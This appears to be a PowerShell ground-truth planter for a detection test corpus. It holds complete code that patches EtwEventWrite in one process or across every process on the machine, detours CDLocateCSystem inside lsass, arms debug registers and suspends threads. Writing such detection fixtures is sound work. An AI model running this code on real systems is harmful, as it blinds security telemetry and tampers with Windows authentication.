# Plants user-mode tamper on the corpus VM so the kernel-side tamper checks have
# a known answer. SYNTHETIC: the technique is planted by this script, in
# processes this script owns. It grades detection of the technique, never how
# often attackers use it.
#
# Usage: powershell -File plant.ps1 -Role etw1|etw2|dr|susp|etwall|skeleton -Out C:\path\truth-ROLE.json
# One process per role. Each writes its ground truth, then sleeps forever so the
# state is live at capture time.
param(
  [Parameter(Mandatory=$true)][ValidateSet('etw1','etw2','dr','susp','etwall','skeleton')][string]$Role,
  [Parameter(Mandatory=$true)][string]$Out
)
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Threading;
public class Plant {
  [DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string n);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint old);
  [DllImport("kernel32")] public static extern IntPtr OpenThread(uint acc, bool inh, uint tid);
  [DllImport("kernel32")] public static extern uint SuspendThread(IntPtr h);
  [DllImport("kernel32")] public static extern uint ResumeThread(IntPtr h);
  [DllImport("kernel32")] public static extern uint GetCurrentThreadId();
  [DllImport("kernel32")] public static extern bool SetThreadContext(IntPtr h, IntPtr ctx);

  // Patches the first bytes of ntdll!EtwEventWrite in THIS process. Returns the
  // address and the original 16 bytes so the truth file can state both.
  public static string PatchEtw(byte[] patch) {
    IntPtr f = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
    byte[] orig = new byte[16];
    Marshal.Copy(f, orig, 0, 16);
    uint old;
    if (!VirtualProtect(f, (UIntPtr)16, 0x40, out old)) throw new Exception("VirtualProtect failed");
    Marshal.Copy(patch, 0, f, patch.Length);
    VirtualProtect(f, (UIntPtr)16, old, out old);
    return f.ToInt64().ToString("x") + "|" + BitConverter.ToString(orig).Replace("-", "");
  }

  static uint started;
  // Starts a thread that sleeps forever; returns its OS thread id.
  public static uint StartSleeper() {
    started = 0;
    Thread t = new Thread(delegate() { started = GetCurrentThreadId(); Thread.Sleep(Timeout.Infinite); });
    t.IsBackground = true; t.Start();
    while (started == 0) Thread.Sleep(10);
    return started;
  }

  // Suspends the thread and leaves it suspended.
  public static void Suspend(uint tid) {
    IntPtr h = OpenThread(0x1FFFFF, false, tid);
    if (h == IntPtr.Zero) throw new Exception("OpenThread failed");
    if (SuspendThread(h) == 0xFFFFFFFF) throw new Exception("SuspendThread failed");
  }

  // Sets Dr0 = addr, Dr7 = 1 (L0, execute) through the documented
  // SetThreadContext path; the kernel records it in DebugActive / ActiveDR7.
  public static void ArmDr0(uint tid, long addr) {
    IntPtr h = OpenThread(0x1FFFFF, false, tid);
    if (h == IntPtr.Zero) throw new Exception("OpenThread failed");
    SuspendThread(h);
    IntPtr raw = Marshal.AllocHGlobal(0x4D0 + 32);
    IntPtr c = (IntPtr)((raw.ToInt64() + 15) & ~15L);
    for (int i = 0; i < 0x4D0; i += 8) Marshal.WriteInt64(c, i, 0);
    Marshal.WriteInt32(c, 0x30, 0x00100010);   // CONTEXT_AMD64 | CONTEXT_DEBUG_REGISTERS
    Marshal.WriteInt64(c, 0x48, addr);         // Dr0
    Marshal.WriteInt64(c, 0x70, 1);            // Dr7: L0, execute
    if (!SetThreadContext(h, c)) throw new Exception("SetThreadContext failed " + Marshal.GetLastWin32Error());
    ResumeThread(h);
  }
  [DllImport("kernel32")] public static extern IntPtr OpenProcess(uint acc, bool inh, uint pid);
  [DllImport("kernel32")] public static extern bool CloseHandle(IntPtr h);
  [DllImport("kernel32")] public static extern bool VirtualProtectEx(IntPtr p, IntPtr a, UIntPtr s, uint np, out uint old);
  [DllImport("kernel32")] public static extern bool ReadProcessMemory(IntPtr p, IntPtr a, byte[] b, UIntPtr n, out UIntPtr r);
  [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr p, IntPtr a, byte[] b, UIntPtr n, out UIntPtr w);
  [DllImport("kernel32")] public static extern bool IsWow64Process(IntPtr p, out bool wow);

  // Machine-wide: patches ntdll!EtwEventWrite to `ret` in every 64-bit process this account may write to. ntdll is mapped at
  // the same address in every process of a boot, so this process's address is used for all. Returns "pid|name|original16" lines
  // for the processes actually patched; the rest (protected, other-session without the right, 32-bit) are left alone.
  public static string PatchAll(byte[] patch) {
    long addr = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite").ToInt64();
    var sb = new System.Text.StringBuilder();
    foreach (System.Diagnostics.Process pr in System.Diagnostics.Process.GetProcesses()) {
      if (pr.Id <= 4) continue;
      IntPtr h = OpenProcess(0x0438, false, (uint)pr.Id);
      if (h == IntPtr.Zero) continue;
      try {
        bool wow; if (!IsWow64Process(h, out wow) || wow) continue;
        byte[] orig = new byte[16]; UIntPtr n;
        if (!ReadProcessMemory(h, (IntPtr)addr, orig, (UIntPtr)16, out n)) continue;
        uint old;
        if (!VirtualProtectEx(h, (IntPtr)addr, (UIntPtr)16, 0x40, out old)) continue;
        UIntPtr w;
        bool ok = WriteProcessMemory(h, (IntPtr)addr, patch, (UIntPtr)patch.Length, out w);
        uint o2; VirtualProtectEx(h, (IntPtr)addr, (UIntPtr)16, old, out o2);
        if (ok) sb.Append(pr.Id + "|" + pr.ProcessName + "|" + BitConverter.ToString(orig).Replace("-", "") + "\n");
      } finally { CloseHandle(h); }
    }
    return addr.ToString("x") + "\n" + sb.ToString();
  }
  [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr p, IntPtr a, UIntPtr s, uint t, uint pr);
  [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);

  // Hooks cryptdll!CDLocateCSystem inside lsass.exe the way a detour does: the first five bytes become `jmp rel32` to a stub
  // allocated in lsass near the module, and the stub runs the two instructions the jump displaced (their rip-relative operands
  // re-expressed as absolute addresses) and jumps back past them, so lsass behaves as before. Needs a non-protected lsass
  // (RunAsPPL off) and SeDebugPrivilege. Returns "pid|cryptdllBase|funcAddr|original16|stubAddr|patched5".
  public static string HookCryptdll() {
    System.Diagnostics.Process lsass = System.Diagnostics.Process.GetProcessesByName("lsass")[0];
    long remoteBase = 0;
    foreach (System.Diagnostics.ProcessModule m in lsass.Modules)
      if (m.ModuleName.ToLower() == "cryptdll.dll") remoteBase = m.BaseAddress.ToInt64();
    if (remoteBase == 0) throw new Exception("cryptdll not mapped in lsass");
    IntPtr local = LoadLibrary("cryptdll.dll");
    long rva = GetProcAddress(local, "CDLocateCSystem").ToInt64() - local.ToInt64();
    long func = remoteBase + rva;
    IntPtr h = OpenProcess(0x1F0FFF, false, (uint)lsass.Id);
    if (h == IntPtr.Zero) throw new Exception("OpenProcess(lsass) failed " + Marshal.GetLastWin32Error());
    byte[] orig = new byte[16]; UIntPtr n;
    if (!ReadProcessMemory(h, (IntPtr)func, orig, (UIntPtr)16, out n)) throw new Exception("read failed");
    // The two displaced instructions: mov eax,[rip+d1] (8b 05 d1) and lea r10,[rip+d2] (4c 8d 15 d2), 13 bytes.
    if (orig[0] != 0x8b || orig[1] != 0x05 || orig[6] != 0x4c || orig[7] != 0x8d || orig[8] != 0x15)
      throw new Exception("unexpected CDLocateCSystem prologue " + BitConverter.ToString(orig));
    long addr1 = func + 6 + BitConverter.ToInt32(orig, 2);
    long addr2 = func + 13 + BitConverter.ToInt32(orig, 9);
    long back = func + 13;
    byte[] stub = new byte[64]; int o = 0;
    Action<byte[]> put = delegate(byte[] b) { Array.Copy(b, 0, stub, o, b.Length); o += b.Length; };
    Action<byte[], long> putImm = delegate(byte[] op, long v) { put(op); put(BitConverter.GetBytes(v)); };
    putImm(new byte[]{0x49, 0xBA}, addr2);            // mov r10, addr2
    putImm(new byte[]{0x49, 0xBB}, addr1);            // mov r11, addr1
    put(new byte[]{0x41, 0x8B, 0x03});                // mov eax, [r11]
    putImm(new byte[]{0x49, 0xBB}, back);             // mov r11, back
    put(new byte[]{0x41, 0xFF, 0xE3});                // jmp r11
    long stubAt = 0;
    for (long a = (remoteBase & ~0xFFFFL) - 0x20000000L; a < remoteBase + 0x20000000L; a += 0x10000L) {
      if (a <= 0x10000) continue;
      IntPtr r = VirtualAllocEx(h, (IntPtr)a, (UIntPtr)0x1000, 0x3000, 0x40);
      if (r != IntPtr.Zero) { stubAt = r.ToInt64(); break; }
    }
    if (stubAt == 0) throw new Exception("no stub region near cryptdll");
    UIntPtr w;
    if (!WriteProcessMemory(h, (IntPtr)stubAt, stub, (UIntPtr)o, out w)) throw new Exception("stub write failed");
    long rel = stubAt - (func + 5);
    if (rel > int.MaxValue || rel < int.MinValue) throw new Exception("stub out of rel32 range");
    byte[] patch = new byte[5]; patch[0] = 0xE9; Array.Copy(BitConverter.GetBytes((int)rel), 0, patch, 1, 4);
    uint old;
    if (!VirtualProtectEx(h, (IntPtr)func, (UIntPtr)16, 0x40, out old)) throw new Exception("VirtualProtectEx failed");
    if (!WriteProcessMemory(h, (IntPtr)func, patch, (UIntPtr)5, out w)) throw new Exception("patch write failed");
    uint o2; VirtualProtectEx(h, (IntPtr)func, (UIntPtr)16, old, out o2);
    return lsass.Id + "|" + remoteBase.ToString("x") + "|" + func.ToString("x") + "|" + BitConverter.ToString(orig).Replace("-", "") + "|" + stubAt.ToString("x") + "|" + BitConverter.ToString(patch).Replace("-", "");
  }
  public static long FuncAddr() { return GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateMailslotW").ToInt64(); }
}
'@

$truth = [ordered]@{ role = $Role; pid = $PID }
switch ($Role) {
  'skeleton' {
    $f = ([Plant]::HookCryptdll()).Split('|')
    $truth.lsass_pid = [int]$f[0]; $truth.cryptdll_base = $f[1]; $truth.export_address = $f[2]
    $truth.original16 = $f[3]; $truth.stub = $f[4]; $truth.patched5 = $f[5]
  }
  'etwall' {
    $lines = ([Plant]::PatchAll([byte[]](0xC3))).Split("`n", [StringSplitOptions]::RemoveEmptyEntries)
    $truth.patch = 'c3'; $truth.address = $lines[0]
    $truth.patched = @($lines | Select-Object -Skip 1 | ForEach-Object { $f = $_.Split('|'); [ordered]@{ pid = [int]$f[0]; name = $f[1]; original16 = $f[2] } })
  }
  'etw1'   { $r = [Plant]::PatchEtw([byte[]](0xC3)).Split('|');            $truth.patch = 'c3';     $truth.address = $r[0]; $truth.original16 = $r[1] }
  'etw2'   { $r = [Plant]::PatchEtw([byte[]](0x33,0xC0,0xC3)).Split('|');  $truth.patch = '33c0c3'; $truth.address = $r[0]; $truth.original16 = $r[1] }
  'dr' {
    $tid = [Plant]::StartSleeper(); $addr = [Plant]::FuncAddr()
    [Plant]::ArmDr0($tid, $addr)
    $truth.tid = $tid; $truth.dr0 = $addr.ToString('x'); $truth.dr7 = '1'
  }
  'susp' {
    $tid = [Plant]::StartSleeper(); [Plant]::Suspend($tid)
    $truth.tid = $tid
  }
}
$truth | ConvertTo-Json -Compress | Out-File -Encoding ascii $Out
while ($true) { Start-Sleep -Seconds 5 }
